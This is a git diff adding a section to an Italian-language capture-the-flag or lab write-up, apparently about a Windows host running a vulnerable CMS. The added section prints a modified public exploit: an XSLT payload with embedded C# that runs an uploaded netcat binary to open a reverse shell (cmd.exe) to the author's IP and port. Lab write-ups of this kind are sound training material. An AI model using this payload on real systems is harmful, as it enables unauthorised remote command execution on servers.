@@ -40,3 +40,21 @@ Faccio quindi il login nell'apposito tab:
 ```
 
 ## Web Exploitation
+
+Studio il CMS sottostante e trovo la versione in running. Per questa versione rintraccio un exploit, il 46153.py. 
+Dopo averlo studiato ne modifico il PoC in modo tale da poter eseguire NetCat che ho caricato in precedenza all'interno dell'Admin dashboard (il cui path globale, studiando la documentazione, scopro essere:v C:/inetpub/wwwroot/Media/):
+
+```
+'<?xml version="1.0"?><xsl:stylesheet version="1.0" \
+xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" \
+xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">\
+<msxsl:script language="C#" implements-prefix="csharp_user">public string xml() \
+{ string cmd = "10.10.14.147 4444 –e cmd.exe"; System.Diagnostics.Process proc = new System.Diagnostics.Process();\
+ proc.StartInfo.FileName = "C:/inetpub/wwwroot/Media/1035/nc64.exe"; proc.StartInfo.Arguments = cmd;\
+ proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; \
+ proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } \
+ </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/>\
+ </xsl:template> </xsl:stylesheet> '
+```
+
+Avvio nc in ascolto anche sulla mia macchina ed eccomi collegato tramite una reverse shell! 
